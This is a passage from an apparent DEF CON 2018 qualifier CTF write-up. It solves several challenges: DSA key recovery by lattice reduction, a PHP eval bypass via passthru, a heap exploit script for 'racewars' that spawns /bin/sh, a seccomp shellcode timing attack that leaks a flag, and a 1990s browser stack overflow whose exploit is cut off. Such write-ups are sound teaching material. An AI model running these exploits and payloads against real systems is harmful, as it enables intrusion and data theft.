550778919109238643794725030183918198033267410208, 115707849027963465953307322004337573514841630363], ... We decided to implement a modified version of the algorithm in the paper which is (allegedly) faster.\nThe goal is to have m.LLL(...)[0][-1] == 1. It the condition is satisfied, we have found the privatekey.\nM = [] t = [] u = [] for i in range(len(sign)): t.append( (sign[i][1] * pow(sign[i][2] * 2^8, -1, q)) % q ) u.append( (-sign[i][0] * pow(sign[i][2] * 2^8, -1, q)) % q ) M0 = [] for a in t: M0.append(int(a)) M1 = [] for b in u: M1.append(int(b)) for i in range(len(sign)): Mi = [0] * (len(sign) + 2) Mi[i] = q M.append(Mi) M.append(M0 + [1, 0]) M.append(M1 + [0, 1]) from sage.modules.free_module_integer import IntegerLattice m = IntegerLattice(M) m.LLL(delta=0.999999999, eta=0.501)[0] Out[]: (...61262266441191146369913672082151254217822682617, 1) Final sanity check # If we got it correctly, the following condition should be true:\nmx = 61262266441191146369913672082151254217822682617 y = 12813568285675088759086... g = 52865703933600072480340... p = 14577437014070574361928... pow(g, q - mx, p) == y And it is! So we:\nSet privkey locally to 678642343241329440366097580369564926238778646902 and sign \u0026ldquo;cat flag\u0026rdquo; Get a valid signature Execute cat flag on remote ??? Profit PHP Eval White-List # For this challenge, we were given a webpage written in PHP, as well as its source code and the binary of a custom PHP extension (that supposedly implements the whitelist to be bypassed). The goal was to execute a binary, flag, and read its output.\nThe page contains a simple form that takes a PHP code snippet, and eval()s it. The challenge was far easier than expected: passthru was allowed (as well as system), and just putting in the form passthru('../flag'); returned the flag :)\nFlag: OOO{Fortunately_php_has_some_rock_solid_defense_in_depth_mecanisms,_so-everything_is_fine.}\nPs-secure # Description # The program was about to generate the flag when something went wrong. We have a coredump of the process.\nPwn tutorial # Process crashed on: 0x555555554e9a inc dword ptr [rax] with RAX 0x555555554e9a ‚óÇ‚Äî inc dword ptr [rax], thus trying to write in a text segment caused segfault. We noticed that the original program had 4 args: integer, integer, input file, output file\nBy reversing program we understood that\u0026hellip; # The first two integers, namely num1 and num2, in argv are used to seed 2 independent LCG. Unfortunately argv was partially overwritten with xxxx by the program, so the original LCG states are lost.\nThe first function sub_B3B opens the input file, generates a random offset (using state num1) and seeks at this offset. Then 128 bytes are read and stored in a heap buffer at address 0x5555557588b0.\nThe program then calls sub_B0A which gets 1 byte offset from rand to modify the caller stack frame by adding this offset to the stored RIP. As such a function that calls sub_B0A does not return where it was called, but somewhere after that point.\nSince the program flow depends on the output of rand and the initial state is unknown, we can\u0026rsquo;t recreate the correct execution flow. So we tried to recover num1 and num2 from the stack when the process crashed, specifically at addresses 0x7fffffffec90 and 0x7fffffffec94, respectively. We also noticed that the state num2 is only used by sub_B0A, while num1 is used for all the remaining rand calls (i.e., seek offset, aligner, flag gen).\nKnowing the last state of num2 we calculated both the previous states and the corresponding rand output. In order to identify the inital num2 state, we tried to identify which value would make sense for the first sub_B0A call.\nThe function noise_loader (called from main @0x1159) has saved return address 0x115E, so we assumed that the modified RIP would point to 0x0118D. As a result the random offset must be 0x0118D - 0x115E = 47. Now we have calculated the list of num2 states starting from the last and back to the (found to be) initial one:\nstate_num2[0] -\u0026gt; 2031993358 state_num2[-1] -\u0026gt; 1480659687 rand() -\u0026gt; 29 # offset of third sub_B0A state_num2[-2] -\u0026gt; 2318365684 rand() -\u0026gt; 65 # offset of second sub_B0A state_num2[-3]: 10821 # i.e. initial arvg[2] rand() -\u0026gt; 47 # offset of first sub_B0A At this stage we can reconstruct the real flow of the program: # void main(int argc, char **argv) { char *func_ptr; int i, j; char filename[32]; int num1 = 0; int num2 = 0; printf(\u0026#34;Thanks for choosing Ps Security\\n\u0026#34;); if ( argc \u0026lt;= 4 ) { printf(\u0026#34;Not enough parameters\\n\u0026#34;); exit(1); } if ( strlen(argv[4]) \u0026gt; 0x1F ) { printf(\u0026#34;Filename too long\\n\u0026#34;); exit(1); } num1 = atoi(argv[1]); num2 = atoi(argv[2]); for (i = 0; i \u0026lt; strlen(argv[1]); ++i) argv[1][i] = \u0026#39;x\u0026#39;; for (j = 0; j \u0026lt; strlen(argv[2]); ++j) argv[2][j] = \u0026#39;x\u0026#39;; sub_B3B(argv[3], \u0026amp;num1, \u0026amp;num2); sub_E51(\u0026amp;num1, (unsigned int *)\u0026amp;num2); strcpy(filename, argv[4]); strcat(filename, \u0026#34;.tXt\u0026#34;); func_ptr = (char *)sub_E51 + (signed int)rand_((unsigned int *)\u0026amp;num1) % 65 + 0x1C; printf(\u0026#34;Hold your breath..\\n\u0026#34;); ((void (__fastcall *)(char *, int *, int *))func_ptr)(filename, \u0026amp;num1, \u0026amp;num2); // which actually corresponds to sub_E9F(filename, \u0026amp;num1, \u0026amp;num2); } int64_t sub_E51(int *num1, unsigned int *num2) { sub_B0A(num2); sub_BD2(num1, num2); } At end of main there is a function call that uses sub_E51 as base address, adding a random offset computed from rand(num1). We noticed that strcat(filename, \u0026quot;.tXt\u0026quot;) caused an overflow that overwrites the value of num1 with \u0026quot;tXt\\x00\u0026quot;: this makes the subsequent rand call to produce a bad offset which then made the program crash.\nHere we started to make educated guesses on the offset that would produce the correct call: the allowed address range is [0xE51+0x1C, 0xE51+0x1C+0x40]. Probably the most correct address in this range is the beginning of sub_E9F that, guess what, computes and prints the flag! However, sub_E9F uses rand(num1) to compute the flag so we still needed to recover the correct num1 state. We identified a set of constraints to calculate this value:\nThe first rand value is equal to the seek position (fseek value recovered from the FILE struct in the heap) In function sub_BD2 rand rand is repeatedly called until rand(num1) == 0. This function prints a dot every 50 iterations and \u0026quot;\\n \u0026quot; every 50 dots. We know that this functions gets called since, looking at the printf heap buffer @0x555555757260, we can tell that at least one full line of dots has been printed and the last line had 30 dots. So the number of iterations of the while is 2500 + 2500*k + 1500 + [0,49] The last rand call is used to calculate func_ptr so rand(num1) % 65 == 50 Using these constraints we tested every possible num1 state value and we have identified about 30 candidates. As a final step we implemented the code that generates the flag in C and\u0026hellip; the first generated flag was correct /o\\\nFollowed a proper Italian-style celebration! # Race Wars # Description: # Jhonny: I gotta get you racing again so I can make some money off your ass. Me: We\u0026rsquo;ll see..\nFirst checks: # $ file ./racewars: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked $ checksec --file ./racewars: Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) After some hours of reversing # We reversed all the basic interaction functions. Such as: choose_engine(), choose_chassis(), etc.. Most of them are just fake and do not allow you to actually make a choice.\nWe understood that upgrade_transmission(transmission_struct * transmission) could have been the game winner. In fact it doas not carefully checks for memory bounds when upgrading the Nth gear ratio. If transmission-\u0026gt;gears_num is set to 0xffffffffffffffff then you can easily gain both arbitrary read and write (byte per byte).\nunsigned __int64 __fastcall upgrade_transmission(transmission_struct *transmission) { __int64 inserted_value; // [rsp+10h] [rbp-20h] __int64 confirm; // [rsp+18h] [rbp-18h] __int64 selected_gear; // [rsp+20h] [rbp-10h] unsigned __int64 v5; // [rsp+28h] [rbp-8h] v5 = __readfsqword(0x28u); inserted_value = -1LL; confirm = -1LL; selected_gear = -1LL; printf(\u0026#34;ok, you have a transmission with %zu gears\\n\u0026#34;, transmission-\u0026gt;gears_num); printf(\u0026#34;which gear to modify? \u0026#34;); __isoc99_scanf(\u0026#34;%zu\u0026#34;, \u0026amp;inserted_value); if ( transmission-\u0026gt;gears_num \u0026gt; (unsigned __int64)--inserted_value ) { printf( \u0026#34;gear ratio for gear %zu is %zu, modify to what?: \u0026#34;, inserted_value + 1, (unsigned __int8)transmission-\u0026gt;ratios[inserted_value + 1]); selected_gear = inserted_value; __isoc99_scanf(\u0026#34;%zu\u0026#34;, \u0026amp;inserted_value); printf(\u0026#34;set gear to %d\\n? (1 = yes, 0 = no)\u0026#34;, inserted_value); __isoc99_scanf(\u0026#34;%zu\u0026#34;, \u0026amp;confirm); if ( confirm ) transmission-\u0026gt;ratios[selected_gear + 1] = inserted_value; } else { puts(\u0026#34;ERROR: can\u0026#39;t modify this gear.\u0026#34;); } return __readfsqword(0x28u) ^ v5; } So we started searching for a bug that could give us the chance to overwrite that variable. We basically reversed all of the functions, including the ones handling the custom allocator used by the program. It was intersting to notice that the custom heap management would not put any boundaries between its allocation. For instance a transmission_struct could have been right next to a chassis one with no chunk headers or any byte separating them.\nWe finally found the bug # After hours spent reversing we realized the bug was instead under our eyes all the time. The choose_tires() function (fragment below) is in fact asking for how many pairs of tires we want for our car. For obvious reasons we must input a number grater or equal then 2. This input is then multiplied for 32 (the size of tire_struct) and passed to get_object_memory() function as its argument. We can just adjust the number of tires to pass the check but overflow the integer to trigger a get_object_memory(0). This ends up returning a valid tire_struct() pointer but not updating the top_chunk addr in the custom arena struct.\nputs(\u0026#34;how many pairs of tires do you need?\u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;tires_pairs); if ( tires_pairs \u0026lt;= 1 ) { puts(\u0026#34;you need at least 4 tires to drive...\u0026#34;); exit(1); } v5 = 32 * tires_pairs; v6 = (tyre_struct *)get_object_memory((custom_arena *)buffer, 32 * tires_pairs); if ( v6 ) *tires_num = 2 * tires_pairs; Exploit strategy # Ok now if we go with something like:\nchoose_chassis() choose_engine() choose_tires() --\u0026gt; 2**27 pairs choose_transmission() We should end in a state in which tires_struct and transmission_struct are allocated in the same memory area. Modifying the tires_struct with the upgrade_tires() function should end up in overwriting the transmission-\u0026gt;gears_num value. To achieve a call to system(\u0026rsquo;/bin/sh\\x00\u0026rsquo;) we found convinient to overwrite custom function pointers implemented by the allocator, which are used in the cleaning_up function (sub_4009F3()) showed below.\nvoid __fastcall cleaning_up(custom_arena *buffer) { custom_arena *ptr; // ST10_8 custom_arena *next_arena; // [rsp+18h] [rbp-18h] bin_struct *j; // [rsp+20h] [rbp-10h] function_struct *i; // [rsp+28h] [rbp-8h] for ( i = (function_struct *)buffer-\u0026gt;functions_list; i; i = (function_struct *)i-\u0026gt;next_func ) { if ( i-\u0026gt;function ) ((void (__fastcall *)(_QWORD))i-\u0026gt;function)(i-\u0026gt;arg); } We just need to place a pointer (using of course our arbitrary write) to a struct built as follows:\nptr_to_function ptr_to_argument 0x00 Calculating offsets to system() and \u0026ldquo;/bin/sh\u0026rdquo; its easy since libc is provided with the challenge.\nFinal exploit # #!/usr/bin/env python2 from pwn import * # context(log_level=\u0026#39;debug\u0026#39;) libc = ELF(\u0026#39;./libc-2.23.so\u0026#39;) #p = process(argv=(\u0026#39;/home/andrea/ld-2.23.so\u0026#39;, \u0026#39;--library-path\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;./racewars\u0026#39;)) p = remote(\u0026#39;2f76febe.quals2018.oooverflow.io\u0026#39;, 31337) def pow_hash(challenge, solution): return hashlib.sha256(challenge.encode(\u0026#39;ascii\u0026#39;) + struct.pack(\u0026#39;\u0026lt;Q\u0026#39;, solution)).hexdigest() def check_pow(challenge, n, solution): h = pow_hash(challenge, solution) return (int(h, 16) % (2**n)) == 0 def solve_pow(challenge, n): candidate = 0 while True: if check_pow(challenge, n, candidate): return candidate candidate += 1 p.recvuntil(\u0026#39;Challenge: \u0026#39;) challenge = p.recvuntil(\u0026#39;\\n\u0026#39;)[:-1] p.recvuntil(\u0026#39;n: \u0026#39;) n = int(p.recvuntil(\u0026#39;\\n\u0026#39;)[:-1]) print(\u0026#39;Solving challenge: \u0026#34;{}\u0026#34;, n: {}\u0026#39;.format(challenge, n)) solution = solve_pow(challenge, n) print(\u0026#39;Solution: {} -\u0026gt; {}\u0026#39;.format(solution, pow_hash(challenge, solution))) p.sendline(str(solution)) def menu(n): p.recvuntil(\u0026#39;CHOICE: \u0026#39;) p.sendline(str(n)) def pick_tires(pairs): menu(1) p.recvuntil(\u0026#39;need?\u0026#39;) p.sendline(str(pairs)) def pick_chassis(): menu(2) p.recvuntil(\u0026#39;eclipse\\n\u0026#39;) p.sendline(\u0026#39;1\u0026#39;) def pick_engine(): menu(3) def pick_transmission(manual=True): menu(4) p.recvuntil(\u0026#39;transmission?\u0026#39;) p.sendline(\u0026#39;1\u0026#39; if manual else \u0026#39;0\u0026#39;) def edit_tires(width, ratio, construction, diameter): menu(1) p.recvuntil(\u0026#39;what?\\n\u0026#39;) p.sendline(\u0026#39;1\u0026#39;) p.recvuntil(\u0026#39;width: \u0026#39;) p.sendline(str(width)) menu(1) p.recvuntil(\u0026#39;what?\\n\u0026#39;) p.sendline(\u0026#39;2\u0026#39;) p.recvuntil(\u0026#39;ratio: \u0026#39;) p.sendline(str(ratio)) menu(1) p.recvuntil(\u0026#39;what?\\n\u0026#39;) p.sendline(\u0026#39;3\u0026#39;) p.recvuntil(\u0026#39;construction (R for radial): \u0026#39;) p.sendline(str(construction)) menu(1) p.recvuntil(\u0026#39;what?\\n\u0026#39;) p.sendline(\u0026#39;4\u0026#39;) p.recvuntil(\u0026#39;diameter: \u0026#39;) p.sendline(str(diameter)) def edit_transmission(gear, ratio, confirm=True): menu(4) p.recvuntil(\u0026#39;modify? \u0026#39;) p.sendline(str(gear)) p.recvuntil(\u0026#39; is \u0026#39;) old = int(p.recvuntil(\u0026#39;,\u0026#39;)[:-1]) p.recvuntil(\u0026#39;what?: \u0026#39;) p.sendline(str(ratio)) p.recvuntil(\u0026#39;0 = no)\u0026#39;) p.sendline(\u0026#39;1\u0026#39; if confirm else \u0026#39;0\u0026#39;) return old pick_chassis() pick_engine() pick_tires(2**27) pick_transmission() edit_tires(0xffff, 0xffff, 0xffff, 0xffff) def write_byte(offset, value): edit_transmission(offset, ord(value)) def read_byte(offset): return chr(edit_transmission(offset, 0, False)) read_qword = lambda offset : u64(\u0026#39;\u0026#39;.join(map(read_byte, range(offset, offset+8)))) heap_leak = read_qword(-48) bin_offset = 0x400000 - heap_leak - 0x38 puts = read_qword(bin_offset + 0x203020) libc_base = puts - libc.symbols[\u0026#39;puts\u0026#39;] system = libc_base + libc.symbols[\u0026#39;system\u0026#39;] binsh = libc_base + libc.search(\u0026#39;/bin/sh\\x00\u0026#39;).next() scratch = bin_offset + 0x203100 ## offset to 0x603100 print \u0026#34;scratch : \u0026#34; + hex(scratch) def write_qword(offset, value): pk = p64(value) for i in range(8): write_byte(offset+i, pk[i]) write_qword(scratch, system) write_qword(scratch+8, binsh) write_qword(scratch+16, 0) write_qword(-128, 0x603100) menu(6) p.interactive() Johnny thinks he\u0026rsquo;s good, johnny just got pwned ! # Flag: OOO{4 c0upl3 0f n1554n 5r205 w0uld pull 4 pr3m1um 0n3 w33k b3f0r3 r4c3 w4rz}\nSbva # We offer extensive website protection that stops attackers even when the admin\u0026rsquo;s credentials are leaked! Try our demo page http://0da57cd5.quals2018.oooverflow.io with username:password admin@oooverflow.io:admin to see for yourself.\nOn login we are redirected to /wrongbrowser.php, but some HTML is leaked anyway:\nHTTP/1.1 302 Found Server: nginx/1.10.3 (Ubuntu) Date: Mon, 14 May 2018 12:51:13 GMT Content-Type: text/html; charset=UTF-8 Connection: close Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Content-Security-Policy: upgrade-insecure-requests Location: wrongbrowser.php Content-Length: 259 \u0026lt;html\u0026gt; \u0026lt;style scoped\u0026gt; h1 {color:red;} p {color:blue;} \u0026lt;/style\u0026gt; \u0026lt;video id=\u0026#34;v\u0026#34; autoplay\u0026gt; \u0026lt;/video\u0026gt; \u0026lt;script\u0026gt; if (navigator.battery.charging) { console.log(\u0026#34;Device is charging.\u0026#34;) } \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; Seems like the login page requires a specific User-Agent to confirm the login: should navigator.battery.charging JavaScript API be supported? Mozilla Documentation states that it is now obsolete and that support for the API has been removed in Firefox 50 in favor of navigator.getBattery().\nBy bruteforcing the version component of the stock Firefox User-Agent header we can confirm that version 42 is the right one and the flag is printed:\nRequest\nPOST /login.php HTTP/1.1 Host: 0da57cd5.quals2018.oooverflow.io User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:42.0) Gecko/20100101 Firefox/42.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-GB,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://0da57cd5.quals2018.oooverflow.io/login.html Content-Type: application/x-www-form-urlencoded Content-Length: 45 Cookie: PHPSESSID=bqn0ut2np2gr7hplkuv4dph4o4 Connection: close Upgrade-Insecure-Requests: 1 username=admin%40oooverflow.io\u0026amp;password=admin Response\nHTTP/1.1 200 OK Server: nginx/1.10.3 (Ubuntu) Date: Mon, 14 May 2018 12:58:58 GMT Content-Type: text/html; charset=UTF-8 Connection: close Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate Pragma: no-cache Content-Security-Policy: upgrade-insecure-requests Content-Length: 291 OOO{0ld@dm1nbr0wser1sth30nlyw@y} \u0026lt;html\u0026gt; \u0026lt;style scoped\u0026gt; h1 {color:red;} p {color:blue;} \u0026lt;/style\u0026gt; \u0026lt;video id=\u0026#34;v\u0026#34; autoplay\u0026gt; \u0026lt;/video\u0026gt; \u0026lt;script\u0026gt; if (navigator.battery.charging) { console.log(\u0026#34;Device is charging.\u0026#34;) } \u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; Flag: OOO{0ld@dm1nbr0wser1sth30nlyw@y}\nShellql # The challenge, reachable at http://b9d6d408.quals2018.oooverflow.io/, provides a link and a shellme.so file. The website accepts a shellcode as POST input and passes it to the shellme function defined in the dynamic library.\nProblems # As soon as we tackled the challenge, we realized we were not able to make any request succeed, all of them would return a 500 error. To complicate things even further, the prclt(22,1) call in the library was setting seccomp in strict mode before executing the shellcode, so we could only do read(), write() and exit() calls.\nWe decided not to waste any time understanding the error and went for an infinite loop to test whether our shellcode was executing correctly or not.\nIdea # Our only shot to get the flag was to interact with the mysql server, but we didn\u0026rsquo;t want to build any c++/php object. Through reproducing the challenge in a local environment, under strace, we noticed that a file descriptor (fd 4) was opened after the connection to the database, so we could write raw mysql commands (using the mysql protocol) to this fd.\nExploit # We decided to ask (write()) for select * from flag to the mysql fd, and then to write (read()) the result of the query into the stack.\nAfter that, we wanted to search for the flag word in memory (that would have been the name of the table written in the response) and then for OOO{ and } in order to be sure we got the right fd.\nTo exfiltrate data from the stack we implemented a timing attack. Our initial goal was to implement a binary search: we would hang the process in an infinite loop in case we cmpared the character in the stack with a smaller/equal char or we would let the process crash.\nAt the end we were just too lazy to do so: we knew we were missing 66 Bytes of flag beetween { and } and we even knew the offset, so we wrote a script to brute\u0026rsquo;em all \\0/.\nHere\u0026rsquo;s our script:\nfrom pwn import * import requests import time import sys URL = \u0026#39;http://b9d6d408.quals2018.oooverflow.io/cgi-bin/index.php\u0026#39; def make_query(): q = \u0026#34;\\24\\0\\0\\0\\3select * from flag;\u0026#34; blocks = [q[i:i+8] for i in range(0, len(q), 8)] unp = [] for b in blocks: unp.append(hex(u64(b))) return unp shellcode =\u0026#34;\u0026#34;\u0026#34; mov rbp,rdi xor rdi, rdi add rdi, 0x4 mov rax, 0x3b67616c66206d6f push rax mov rax,0x7266202a20746365 push rax mov rax, 0xdeadbeefcafebabe mov rdx, 0xb2c8cdeccafebaaa xor rax, rdx push rax mov rsi, rsp xor rdx,rdx add rdx, 24 xor rdi, rdi add rdi, 0x4 xor rax, rax inc rax syscall xor rax,rax mov rsi, rsp add rdx, 77777777 syscall \u0026#34;\u0026#34;\u0026#34; def test_fn(index, char): payload = shellcode + \u0026#34;\u0026#34;\u0026#34; xor rax,rax mov al, {} add rsp, rax movzx rax, byte ptr [rsp - 1] mov dl, {} cmp dl, al je LOOP jmp SEGV LOOP: jmp LOOP SEGV: pop rax \u0026#34;\u0026#34;\u0026#34;.format(index, char) payload = asm(payload, arch=\u0026#34;x86_64\u0026#34;) if any(ord(ch) == 0 for ch in payload): print \u0026#34;AIUTO\u0026#34; start_t = time.time() try: requests.post(URL, timeout=3, data={\u0026#39;shell\u0026#39;: payload}) except requests.exceptions.ReadTimeout : pass except requests.exceptions.ConnectionError : pass end_t = time.time() print \u0026gt;\u0026gt; sys.stderr, str(end_t - start_t) if end_t - start_t \u0026gt; 1.3: return True return False def get_char(idx): for i in \u0026#34;O{abcdefghijklmnopqrstuvwxyz_, 0123456789!\\\u0026#39;}\u0026#34;: if test_fn(idx, ord(i)): print \u0026gt;\u0026gt; sys.stderr, i return i return \u0026#34;X\u0026#34; def multiprocess_get_flag(beg, end, n_processes): from multiprocessing import Pool pool = Pool(processes=n_processes) return \u0026#39;\u0026#39;.join(pool.imap(get_char, range(beg, end))) def get_flag(beg,end): flag = \u0026#34;\u0026#34; for j in range(beg, end): flag += get_char(j) print flag return flag if __name__ == \u0026#34;__main__\u0026#34;: #print get_flag(70, 140) print multiprocess_get_flag(69, 140, 4) This method was not 100% reliable but running it a couple of times gave us the correct flag.\nAt the end the flag was: OOO{shellcode and webshell is old news, get with the times my friend!}\nTechSupport # When connecting to the remote server, we get something like:\nThank you for contacting Chemisoft technical support. My name is Elen, how can I help you? foo Is your keyboard properly connected to the computer? yes Did you experience similar problems with other software as well? no Does the program persists when you are not looking at it? yes I heard sometimes bugs are caused by the presence of floppy drives. Do you have one? no Alright then - it looks like we ruled out the most common problems. So, let me now look at the program for you. I am going to use port 3456. Everything ready on your side? yes Then we get an incoming GDB connection on 3456. We set up a GDB server that runs the provided mcalc binary (a simple molecular weight calculator). It complains about the invalid license, and the challenge server performs integrity checks via GDB to protect from patching. Those can be bypassed either by writing a fake GDB server, or by patching the binary in a way that is not detected (most of the time):\n004016fe mov dword [rbp-0x30 {var_38}], 0xabc8eef 00401705 mov dword [rbp-0x2c {var_34}], 0xb096bff4 0040170c mov dword [rbp-0x28 {var_30}], 0xe0c54799 00401713 mov dword [rbp-0x24 {var_2c}], 0x68cbc732 0040171a nop (...) 00401721 nop Now the helpdesk says the program worked fine. We patch in a int 3 at 0x401abb to make it crash, it says it\u0026rsquo;ll try to reproduce the bug. So we need to make the original binary crash through the input formula only.\nIt is possible to force a division by zero. main calculates the total weight as sum of every count by its atom\u0026rsquo;s weight, and if greater than 1000 it calls the sub at 0x40190b to print stats about the main element. In the sub, the total weight (re-calculated) is used as denominator. Because of how the element-count mapping array in main is populated, if the same element is repeated multiple times, main will sum all occurrences, while the sub\u0026rsquo;s total will only use the rightmost occurrence. So if we find a chemical formula that overflows the 32-bit sum to zero, then prepend an atom (with weight \u0026gt; 1000) that is already in the formula, we get a weight greater than 1000 in main but equal to zero in the sub, causing a division by zero. Such a formula can be found as a solution to an LP problem (minimizing used atoms, as there is a length limit).\nOnce the remote reproduction crashes, too, the helpdesk prints out the differences between the two states (our crash and reproduced crash). If a register is a valid memory address, it shows a dereferenced qword. So plan is: control a remote register at the crash to dereference the valid license buffer (which is reasonably the flag).\nBefore calling the sub, ecx contains the total weight as calculated in main, and it is not touched by the sub before the division. We build a formula so that the right portion overflows to zero (to trigger the crash), and the left portion uses only atoms already present in the right portion and sums to the address we want to read (to set ecx). License is 16 bytes at 0x6033d0, so two crafted formulas later, we have the flag.\nScript to generate the formulas:\n#!/usr/bin/python3 import struct import pulp with open(\u0026#39;mcalc\u0026#39;, \u0026#39;rb\u0026#39;) as f: f.seek(0x30a0) raw_atoms = f.read(8 * 100) atoms = [] for i in range(0, len(raw_atoms), 8): raw_atom = raw_atoms[i:i+8] atom = (raw_atom[:4].strip(b\u0026#39;\\x00\u0026#39;).decode(\u0026#39;ascii\u0026#39;), struct.unpack(\u0026#39;\u0026lt;I\u0026#39;, raw_atom[4:])[0]) atoms.append(atom) def formula(goal): prob = pulp.LpProblem(\u0026#39;Formula Left\u0026#39;, pulp.LpMinimize) cnt = pulp.LpVariable.dicts(\u0026#39;cnt\u0026#39;, range(len(atoms)), lowBound=0, upBound=999, cat=\u0026#39;Integer\u0026#39;) used = pulp.LpVariable.dicts(\u0026#39;used\u0026#39;, range(len(atoms)), cat=\u0026#39;Binary\u0026#39;) prob += sum(used) prob += sum(atoms[i][1] * cnt[i] for i in range(len(atoms))) == GOAL prob += sum(cnt) \u0026gt; 0 for i in range(len(atoms)): prob += used[i] \u0026lt;= cnt[i], \u0026#39;C_{}_upper\u0026#39;.format(i) prob += cnt[i] \u0026lt;= 10000*used[i], \u0026#39;C_{}_lower\u0026#39;.format(i) prob.solve() formula = \u0026#39;\u0026#39; first_part_atoms = [] for i in range(len(atoms)): value = int(pulp.value(cnt[i])) if value \u0026gt; 0: formula += \u0026#39;{}{}\u0026#39;.format(atoms[i][0], value if value \u0026gt; 1 else \u0026#39;\u0026#39;) first_part_atoms.append(i) prob = pulp.LpProblem(\u0026#39;Formula Right\u0026#39;, pulp.LpMinimize) cnt = pulp.LpVariable.dicts(\u0026#39;cnt\u0026#39;, range(len(atoms)), lowBound=0, upBound=999, cat=\u0026#39;Integer\u0026#39;) used = pulp.LpVariable.dicts(\u0026#39;used\u0026#39;, range(len(atoms)), cat=\u0026#39;Binary\u0026#39;) prob += sum(used) prob += sum(atoms[i][1] * cnt[i] for i in range(len(atoms))) == 2**32 prob += sum(cnt) \u0026gt; 0 for i in range(len(atoms)): prob += used[i] \u0026lt;= cnt[i], \u0026#39;C_{}_upper\u0026#39;.format(i) prob += cnt[i] \u0026lt;= 10000*used[i], \u0026#39;C_{}_lower\u0026#39;.format(i) for i in first_part_atoms: prob += used[i] == True prob.solve() for i in range(len(atoms)): value = int(pulp.value(cnt[i])) if value \u0026gt; 0: formula += \u0026#39;{}{}\u0026#39;.format(atoms[i][0], value if value \u0026gt; 1 else \u0026#39;\u0026#39;) return formula LICENSE_ADDR = 0x6033d0 LICENSE_QWORDS = 2 for i in range(LICENSE_QWORDS): goal = LICENSE_ADDR + 8*i print(\u0026#39;0x{:x}: {}\u0026#39;.format(goal, formula(goal))) WWW # www, aka pwning browsers from the 90s.\nChallenge Description # The challenge asks for a URL to be visited by the browser WorldWideWeb 0.15 running on the NeXTSTEP OS (arch m68k).\nOnce submitted the URL, the challenges returns a set of screenshots captured during the execution of the browser.\nVulnerability # First, by submitting a test URL and inspecting the returned screenshots, we were able to identify the OS version and the browser. Then, we found and configured a NeXTSTEP m68k emulator: http://previous.alternative-system.com/, on which we installed the WorldWideWeb browser and a version of gdb. We were also able to download the browser sources, from which we identified a classic stack overflow.\nIn fact, the HTTP_Get function contains a 257 bytes buffer (command), used to perform the HTTP GET request, and then copies the URL into it without checking sizes:\n#ifdef __STDC__ int HTTP_Get(const char * arg) #else int HTTP_Get(arg) char * arg; #endif { int s; /* Socket number for returned data */ char command[257]; /* The whole command */ int status; /* tcp return */ ... strcpy(command, \u0026#34;GET \u0026#34;); { char * p1 = HTParse(arg, \u0026#34;\u0026#34;, PARSE_PATH|PARSE_PUNCTUATION); strcat(command, p1); free(p1); } Exploit # We were very happy to realize that no security measure (NX, ASLR,..) was implemented in the 90s. This means we could craft a shellcode, put it in the stack (together with a nice NOP sled), jump to it, and execute it.\nAfter several attempts to write a working shellcode for m68k we were successfully able to execute commands. First, we tried by executing system(\u0026quot;open flag\u0026quot;), which runs a graphic text editor opening the flag file. However, on the remote machine the editor appeared behind the browser window, hiding half of the flag. Second, we executed cat flag, looking at the output in the already opened console. Even in this case we failed, as last chars of the flag were still behind the browser window. Finally, by executing cat flag five times in our shellcode, we were able to see the entire flag.\nFlag: defconctf{Party_like_its_1992_for_the_next_Step}\nExploit:\nfrom pwn import * import base64 import sys import time import os host = \u0026#39;ddee3e1a.quals2018.oooverflow.io\u0026#39; port = 31337 def pow_hash(challenge, solution): return hashlib.sha256(challenge.encode(\u0026#39;ascii\u0026#39;) + struct.pack(\u0026#39;\u0026lt;Q\u0026#39;, solution)).hexdigest() def check_pow(challenge, n, solution): h = pow_hash(challenge, solution) return (int(h, 16) % (2**n)) == 0 def solve_pow(challenge, n): candidate = 0 while True: if check_pow(challenge, n, candidate): return candidate candidate += 1 def connect(): global conn conn.close() conn = remote(host,port) conn.recvuntil(\u0026#39;Challenge: \u0026#39;) challenge = conn.recvuntil(\u0026#39;\\n\u0026#39;)[:-1] conn.recvuntil(\u0026#39;n: \u0026#39;) n = int(conn.recvuntil(\u0026#39;\\n\u0026#39;)[:-1]) solution = solve_pow(challenge, n) conn.sendline(str(solution)) conn = remote(host,port) connect() filename = int(time.time()) os.mkdir(str(filename)) DOUBLE_NOP = \u0026#39;\\x4e\\x71\\x4e\\x71\u0026#39; shellcode = 